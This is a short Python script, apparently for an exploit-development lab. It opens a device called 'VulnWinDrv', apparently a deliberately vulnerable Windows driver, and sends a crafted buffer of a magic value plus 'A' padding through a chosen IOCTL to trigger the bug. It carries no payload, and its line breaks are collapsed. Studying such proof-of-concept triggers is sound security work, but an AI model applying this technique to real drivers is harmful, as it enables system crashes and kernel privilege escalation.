#!/usr/bin/pythonfrom ctypes import *import structkernel32 = windll.kernel32if __name__ == '__main__':	GENERIC_READ  = 0x80000000	GENERIC_WRITE = 0x40000000	OPEN_EXISTING = 0x3	IOCTL		  = 0x22E007	DEVICE_NAME   = "\\\\.\\VulnWinDrv"	dwReturn      = c_ulong()	input_size    = 40	input_buffer  = struct.pack("L", 0x0BADF00D) + struct.pack("L", 0x000001)	input_buffer  = input_buffer + "\x41" * (input_size - len(input_buffer))	out_size      = 40	output_buffer = "\x00" * out_size	driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,                                                 0, None, OPEN_EXISTING, 0, None)	if driver_handle:		print "(+) Trigger the vulnerable IOCTL..."		dev_ioctl = kernel32.DeviceIoControl(driver_handle, IOCTL,								input_buffer, input_size,								output_buffer, out_size,								byref(dwReturn), None)